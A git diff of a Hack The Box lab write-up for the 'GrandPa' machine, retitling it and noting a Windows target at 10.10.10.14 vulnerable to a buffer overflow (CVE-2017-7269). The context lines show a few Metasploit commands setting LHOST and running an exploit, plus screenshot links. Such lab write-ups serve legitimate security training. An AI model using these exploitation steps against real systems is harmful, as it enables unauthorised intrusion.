@@ -1,9 +1,8 @@
-# GrandPa
+# HAck the Box - GrandPa
 
 ```CSS
-Machine IP: 10.10.10.14
-OS: Windows
-Web Server:
+Machine IP: 10.10.10.14 - Windows
+Buffer Overflow (CVE-2017-7269)
 ```
 
 ### Port Scanning and Service Discovery
@@ -64,4 +63,5 @@ msf6> set LHOST 10.10.14.34
 msf6> exploit
 ```
 ![image](https://user-images.githubusercontent.com/83878909/229052744-ef9e0f9b-9225-4d1b-92f4-c82e487d5e79.png)
+![image](https://user-images.githubusercontent.com/83878909/229055181-d755ef79-b391-491d-aaab-4a7fe0258e39.png)
 
